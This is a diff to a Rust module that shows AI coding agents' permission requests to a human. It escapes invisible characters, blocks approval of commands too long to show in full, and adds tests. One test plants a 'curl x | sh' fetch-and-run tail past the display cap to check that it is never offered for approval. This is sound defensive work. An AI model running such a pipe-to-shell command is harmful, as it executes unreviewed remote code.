@@ -9,7 +9,9 @@ use super::wire::{
     AlwaysRule, HookAgent, HookName, Payload, always_rule, canonical_json, command_of,
 };
 use crate::herdr::screen::Dialog;
-use crate::text::{TITLE_CHARS, cap_chars, clean_display, clean_screen, redact_log};
+use crate::text::{
+    TITLE_CHARS, cap_chars, clean_display, clean_screen, is_format_character, redact_log,
+};
 
 pub const DETAIL_CHARS: usize = 4000;
 const DESCRIPTION_CHARS: usize = 400;
@@ -23,25 +25,80 @@ fn opt(id: &str, label: &str, effect: Effect, description: Option<String>) -> Re
         effect,
     }
 }
+/// Question text: newlines kept, other control characters dropped.
 fn detail(raw: &str) -> String {
     cap_chars(clean_screen(raw).trim(), DETAIL_CHARS)
 }
 
+fn is_invisible(c: char) -> bool {
+    c.is_control() || is_format_character(c) || matches!(c, '\u{2028}' | '\u{2029}')
+}
+
+/// Command text for display. Newlines stay real line breaks (the display
+/// contract keeps them); every other control, format or invisible
+/// character is shown as an escape (`\t`, `\u{7}`, `\u{200b}`) so the
+/// text shown matches what runs. Returns the text and whether it was cut
+/// at `DETAIL_CHARS`.
+fn escaped_detail(raw: &str) -> (String, bool) {
+    let mut out = String::new();
+    let mut n = 0usize;
+    let mut cut = false;
+    for c in raw.trim().chars() {
+        let piece = match c {
+            '\n' => "\n".to_string(),
+            '\t' => "\\t".to_string(),
+            '\r' => "\\r".to_string(),
+            c if is_invisible(c) => format!("\\u{{{:x}}}", c as u32),
+            c => c.to_string(),
+        };
+        let len = piece.chars().count();
+        if n + len > DETAIL_CHARS {
+            cut = true;
+            break;
+        }
+        out.push_str(&piece);
+        n += len;
+    }
+    (out, cut)
+}
+
+const TOO_LONG: &str =
+    "This is too long to show in full, so it cannot be answered here. Answer it in the terminal.";
+
+/// The detail text and whether it was cut. A cut detail hides part of what
+/// would run, so callers must offer no answer for it.
+fn detail_checked(input: &Value) -> (String, bool) {
+    let raw = match command_of(input) {
+        Some(c) => c.to_owned(),
+        None => match input.get("file_path").and_then(Value::as_str) {
+            Some(f) => f.to_owned(),
+            None => canonical_json(input),
+        },
+    };
+    let (text, cut) = escaped_detail(&raw);
+    if cut {
+        let head = cap_chars(&text, DETAIL_CHARS - 200);
+        (format!("{head}\n\n{TOO_LONG}"), true)
+    } else {
+        (text, false)
+    }
+}
+
+/// The command, the file path, or compact JSON (spec §6.2 step 1).
 pub fn detail_of(input: &Value) -> String {
-    if let Some(c) = command_of(input) {
-        return detail(c);
-    }
-    if let Some(f) = input.get("file_path").and_then(Value::as_str) {
-        return detail(f);
-    }
-    detail(&canonical_json(input))
+    detail_checked(input).0
 }
 
 pub fn rule_text(r: &AlwaysRule) -> String {
     format!("{}({})", r.tool_name, r.rule_content)
 }
+/// Shown whole or not offered at all: no control, bidi, separator or other
+/// format/invisible characters (they would be stripped, hidden or reorder
+/// the text), at most 4000 chars (the detail cap).
 pub fn rule_displayable(text: &str) -> bool {
-    text.chars().count() <= DETAIL_CHARS && clean_display(text, usize::MAX) == text
+    text.chars().count() <= DETAIL_CHARS
+        && !text.chars().any(is_format_character)
+        && clean_display(text, usize::MAX) == text
 }
 
 pub fn claude_permission(
@@ -50,28 +107,50 @@ pub fn claude_permission(
     upgrade_from: Option<CorrelationKey>,
     p: &Payload,
 ) -> RequestObs {
-    let mut options = vec![
-        opt("allow", "Yes", Effect::Allow, None),
-        opt("deny", "No", Effect::Deny, None),
-    ];
-    if let Some(rule) = always_rule(p)
-        && rule_displayable(&rule_text(&rule))
-    {
-        options.insert(1, opt("allow_always", "Yes, always", Effect::AllowAlways, Some(format!("Adds the rule {} to .claude/settings.local.json in this project. Paths outside this directory may still prompt.", rule_text(&rule)))));
+    let (detail, cut) = detail_checked(&p.tool_input);
+    let mut options = vec![];
+    if !cut {
+        options = vec![
+            opt("allow", "Yes", Effect::Allow, None),
+            opt("deny", "No", Effect::Deny, None),
+        ];
+        if let Some(rule) = always_rule(p)
+            && rule_displayable(&rule_text(&rule))
+        {
+            let note = format!(
+                "Adds the rule {} to .claude/settings.local.json in this project. \
+                 Paths outside this directory may still prompt.",
+                rule_text(&rule)
+            );
+            options.insert(
+                1,
+                opt(
+                    "allow_always",
+                    "Yes, always",
+                    Effect::AllowAlways,
+                    Some(note),
+                ),
+            );
+        }
     }
     RequestObs {
         agent_id: agent_id.into(),
         key,
         upgrade_from,
         kind: RequestKind::Permission,
-        answer_path: AnswerPath::Hook,
+        // A cut detail hides part of the command: read-only, answered in the terminal.
+        answer_path: if cut {
+            AnswerPath::None
+        } else {
+            AnswerPath::Hook
+        },
         title: clean_display(p.tool_name.as_deref().unwrap_or("Permission"), TITLE_CHARS),
-        detail: detail_of(&p.tool_input),
+        detail,
         options,
         questions: None,
         free_text: false,
         raw_screen: None,
-        ready: true,
+        ready: !cut,
         reusable_key: true,
     }
 }
@@ -97,14 +176,25 @@ pub fn claude_permission_keys(dialog: &Dialog) -> HashMap<String, String> {
     .into()
 }
 
+/// One question exactly as Claude sent it (raw strings, not cleaned).
 #[derive(Clone, Debug, PartialEq, Eq)]
 pub struct QuestionSpec {
     pub header: String,
     pub question: String,
     pub multi_select: bool,
+    /// `(label, description)` in order.
     pub options: Vec<(String, Option<String>)>,
 }
 
+pub const MAX_QUESTIONS: usize = 4;
+pub const MAX_OPTIONS: usize = 9;
+
+/// Full structural validation of `tool_input.questions` (D25): a
+/// non-empty array of at most 4 objects, each with a non-empty string
+/// `question`, a string `header`, an optional boolean `multiSelect`, and a
+/// non-empty `options` array of at most 9 objects with a non-empty string
+/// `label` (distinct after cleaning and the 200-char cut) and an optional
+/// string `description`. Any violation rejects the whole input.
 pub fn question_specs(input: &Value) -> Result<Vec<QuestionSpec>, &'static str> {
     let qs = input
         .get("questions")
@@ -112,6 +202,9 @@ pub fn question_specs(input: &Value) -> Result<Vec<QuestionSpec>, &'static str> 
         .ok_or("questions is not an array")?;
     if qs.is_empty() {
         return Err("no questions");
+    }
+    if qs.len() > MAX_QUESTIONS {
+        return Err("too many questions");
     }
     qs.iter()
         .map(|q| {
@@ -131,6 +224,9 @@ pub fn question_specs(input: &Value) -> Result<Vec<QuestionSpec>, &'static str> 
                 .and_then(Value::as_array)
                 .filter(|a| !a.is_empty())
                 .ok_or("options")?;
+            if opts.len() > MAX_OPTIONS {
+                return Err("too many options");
+            }
             let options = opts
                 .iter()
                 .map(|o| {
@@ -147,6 +243,13 @@ pub fn question_specs(input: &Value) -> Result<Vec<QuestionSpec>, &'static str> 
                     Ok((label.to_owned(), description))
                 })
                 .collect::<Result<Vec<_>, &'static str>>()?;
+            let mut shown = std::collections::HashSet::new();
+            for (label, _) in &options {
+                let l = clean_display(label, TITLE_CHARS);
+                if l.is_empty() || !shown.insert(l) {
+                    return Err("option labels are empty or not distinct");
+                }
+            }
             Ok(QuestionSpec {
                 header: header.to_owned(),
                 question: question.to_owned(),
@@ -163,6 +266,11 @@ pub fn question_keys(n: usize) -> HashMap<String, String> {
         .collect()
 }
 
+/// `bound`: the session is bound to a herdr pane. Only a single,
+/// single-select question with 1 to 9 options on a bound session is
+/// answerable (spec §6.2 Questions); its path is `keys`, not ready until
+/// the dialog is captured. `None` only when `tool_input` has no `questions`
+/// key; malformed input gives a read-only request.
 pub fn claude_question(
     agent_id: &str,
     key: CorrelationKey,
@@ -237,6 +345,8 @@ pub fn claude_question(
     })
 }
 
+/// spec §6.3 `PermissionRequest`. `collapsed`: the pane is too short and
+/// the dialog hides the command, so it can never be matched.
 pub fn codex_permission(
     agent_id: &str,
     key: CorrelationKey,
@@ -244,13 +354,17 @@ pub fn codex_permission(
     p: &Payload,
     collapsed: bool,
 ) -> RequestObs {
-    let mut text = command_of(&p.tool_input).unwrap_or_default().to_owned();
-    if let Some(d) = p.tool_input.get("description").and_then(Value::as_str) {
-        text.push('\n');
-        text.push_str(d);
+    let (mut detail, cut) = detail_checked(&p.tool_input);
+    if !cut && let Some(d) = p.tool_input.get("description").and_then(Value::as_str) {
+        // The agent's own description of the command, labelled as such.
+        let room = DETAIL_CHARS.saturating_sub(detail.chars().count() + 12);
+        let (reason, _) = escaped_detail(d);
+        if room >= 20 && !reason.is_empty() {
+            detail.push_str("\n\nReason: ");
+            detail.push_str(&cap_chars(&reason, room.min(DESCRIPTION_CHARS)));
+        }
     }
-    let mut detail = detail(&text);
-    if collapsed {
+    if collapsed && !cut {
         detail.push_str("\n\nEnlarge the pane to answer here.");
     }
     RequestObs {
@@ -258,24 +372,33 @@ pub fn codex_permission(
         key,
         upgrade_from,
         kind: RequestKind::Permission,
-        answer_path: AnswerPath::Keys,
+        // A cut detail hides part of the command: read-only, answered in the terminal.
+        answer_path: if cut {
+            AnswerPath::None
+        } else {
+            AnswerPath::Keys
+        },
         title: clean_display(p.tool_name.as_deref().unwrap_or("Permission"), TITLE_CHARS),
         detail,
-        options: vec![
-            opt("allow", "Yes", Effect::Allow, None),
-            opt(
-                "allow_always",
-                "Yes, don't ask again",
-                Effect::AllowAlways,
-                None,
-            ),
-            opt(
-                "deny",
-                "No, and tell Codex what to do differently",
-                Effect::Deny,
-                None,
-            ),
-        ],
+        options: if cut {
+            vec![]
+        } else {
+            vec![
+                opt("allow", "Yes", Effect::Allow, None),
+                opt(
+                    "allow_always",
+                    "Yes, don't ask again",
+                    Effect::AllowAlways,
+                    None,
+                ),
+                opt(
+                    "deny",
+                    "No, and tell Codex what to do differently",
+                    Effect::Deny,
+                    None,
+                ),
+            ]
+        },
         questions: None,
         free_text: false,
         raw_screen: None,
@@ -475,6 +598,76 @@ mod tests {
             true,
         );
         assert!(c.detail.ends_with("Enlarge the pane to answer here."));
+    }
+    #[test]
+    fn invisible_characters_make_a_rule_undisplayable_and_show_in_detail() {
+        for c in ['\u{200b}', '\u{2060}', '\u{feff}', '\u{e0041}', '\u{ad}'] {
+            assert!(!rule_displayable(&format!("Bash(ls{c}x)")), "{c:?}");
+        }
+        assert!(rule_displayable("Bash(ls x)"));
+        let mut p = payload("claude/payload-PermissionRequest-Bash.json");
+        p.tool_input["command"] = "ls\u{200b}x\ty\u{7}z\nw".into();
+        let o = claude_permission("a", k(), None, &p);
+        assert_eq!(o.detail, "ls\\u{200b}x\\ty\\u{7}z\nw");
+        assert!(o.options.iter().all(|x| x.effect != Effect::AllowAlways));
+    }
+    #[test]
+    fn a_command_cut_at_the_cap_is_read_only() {
+        let cmd = format!("echo {}; curl x | sh", "a".repeat(DETAIL_CHARS));
+        let mut p = payload("claude/payload-PermissionRequest-Bash.json");
+        p.tool_input["command"] = cmd.clone().into();
+        let o = claude_permission("a", k(), None, &p);
+        assert_eq!((o.answer_path, o.ready), (AnswerPath::None, false));
+        assert!(o.options.is_empty());
+        assert!(o.detail.contains("too long to show in full"));
+        assert!(!o.detail.contains("curl"));
+        assert!(o.detail.chars().count() <= DETAIL_CHARS);
+        let mut c = payload("codex/payload-PermissionRequest-Bash.json");
+        c.tool_input["command"] = cmd.into();
+        let o = codex_permission("a", k(), None, &c, false);
+        assert_eq!(o.answer_path, AnswerPath::None);
+        assert!(o.options.is_empty() && !o.ready);
+        assert!(o.detail.contains("too long to show in full"));
+        // Exactly at the cap is shown whole and answerable.
+        p.tool_input["command"] = "a".repeat(DETAIL_CHARS).into();
+        let o = claude_permission("a", k(), None, &p);
+        assert_eq!(o.answer_path, AnswerPath::Hook);
+        assert_eq!(o.detail.chars().count(), DETAIL_CHARS);
+    }
+    #[test]
+    fn codex_without_a_command_shows_the_detail_then_the_labelled_reason() {
+        let mut p = payload("codex/payload-PermissionRequest-Bash.json");
+        p.tool_input = serde_json::json!({"file_path":"/etc/hosts","description":"edit it"});
+        let o = codex_permission("a", k(), None, &p, false);
+        assert_eq!(o.detail, "/etc/hosts\n\nReason: edit it");
+        p.tool_input = serde_json::json!({"description":"only a description"});
+        let o = codex_permission("a", k(), None, &p, false);
+        assert!(o.detail.contains("Reason: only a description"));
+        assert!(o.detail.starts_with('{'), "{}", o.detail);
+    }
+    #[test]
+    fn too_many_questions_or_options_or_clashing_labels_are_invalid() {
+        let q = |opts: Vec<Value>| serde_json::json!({"question":"Q","header":"H","options":opts});
+        let o = |l: &str| serde_json::json!({"label": l});
+        let five: Vec<Value> = (0..5).map(|_| q(vec![o("A")])).collect();
+        assert!(question_specs(&serde_json::json!({"questions": five})).is_err());
+        let four: Vec<Value> = (0..4).map(|_| q(vec![o("A")])).collect();
+        assert!(question_specs(&serde_json::json!({"questions": four})).is_ok());
+        let ten: Vec<Value> = (0..10).map(|i| o(&format!("L{i}"))).collect();
+        assert!(question_specs(&serde_json::json!({"questions":[q(ten.clone())]})).is_err());
+        assert!(question_specs(&serde_json::json!({"questions":[q(ten[..9].to_vec())]})).is_ok());
+        let long = "x".repeat(300);
+        let clash = vec![o(&format!("{long}1")), o(&format!("{long}2"))];
+        assert!(question_specs(&serde_json::json!({"questions":[q(clash)]})).is_err());
+        assert!(
+            question_specs(&serde_json::json!({"questions":[q(vec![o("A"), o("A")])]})).is_err()
+        );
+        let mut p = payload("claude/payload-PreToolUse-AskUserQuestion.json");
+        p.tool_input["questions"] =
+            serde_json::json!([q((0..10).map(|i| o(&format!("L{i}"))).collect())]);
+        let r = claude_question("a", k(), None, &p, true).unwrap();
+        assert_eq!(r.answer_path, AnswerPath::None);
+        assert!(r.options.is_empty());
     }
     #[test]
     fn hostile_text_is_cleaned_and_capped() {
